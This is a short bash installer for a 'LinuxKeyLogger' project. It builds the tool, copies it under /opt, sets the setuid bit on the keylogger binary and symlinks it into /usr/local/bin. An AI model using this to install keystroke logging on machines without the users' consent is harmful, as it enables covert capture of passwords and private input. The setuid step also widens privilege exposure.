#!/bin/bash

echo -n "install directory (/opt)? "
read DIR

if [ "$DIR" = "" ];
then
	DIR="/opt"
fi

echo "You selected : $DIR"
if [ -d $DIR ]; then
	echo $DIR directory found
	if [ -d $DIR/LinuxKeyLogger ]; then
		echo -n "LinuxKeyLogger already installed. replace (y/n)?"
		read x
		if [ $x = "y" ]; then
			rm -r $DIR/LinuxKeyLogger
			echo removed old installation
		else 
			if [ $x = "n" ]; then
				exit
			else
				echo "didnt understand $x"
				exit
			fi
		fi
	fi
	echo making LinuxKeyLogger Directory
	mkdir $DIR/LinuxKeyLogger
	echo Building source
	make
	echo Installing
	cp -r . $DIR/LinuxKeyLogger
	chmod u+s $DIR/LinuxKeyLogger/bin/keylogger.out
	ln -s $DIR/LinuxKeyLogger/bin/keylogger.out /usr/local/bin/keylogger
	echo Finished Installing
else
	echo "$DIR directory does not exist"
fi


